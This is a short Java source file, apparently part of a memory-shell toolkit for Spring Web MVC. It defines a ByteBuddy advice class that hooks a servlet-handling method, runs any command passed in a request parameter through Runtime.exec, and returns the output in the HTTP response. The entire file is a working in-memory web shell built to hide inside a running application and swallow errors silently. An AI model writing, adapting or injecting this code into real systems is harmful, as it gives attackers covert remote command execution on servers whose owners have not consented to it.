package com.reajason.javaweb.memshell.springwebmvc.command;

import net.bytebuddy.asm.Advice;

import java.io.InputStream;
import java.io.OutputStream;

/**
 * @author ReaJason
 * @since 2025/1/18
 */
public class CommandServletAdvisor {
    @Advice.OnMethodEnter(skipOn = Advice.OnNonDefaultValue.class)
    public static boolean enter(
            @Advice.Argument(value = 0) Object request,
            @Advice.Argument(value = 1) Object response
    ) {
        String paramName = "paramName";
        try {
            String cmd = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName);
            if (cmd != null) {
                Process exec = Runtime.getRuntime().exec(cmd);
                InputStream inputStream = exec.getInputStream();
                OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
                return true;
            }
        } catch (Exception ignored) {
        }
        return false;
    }
}
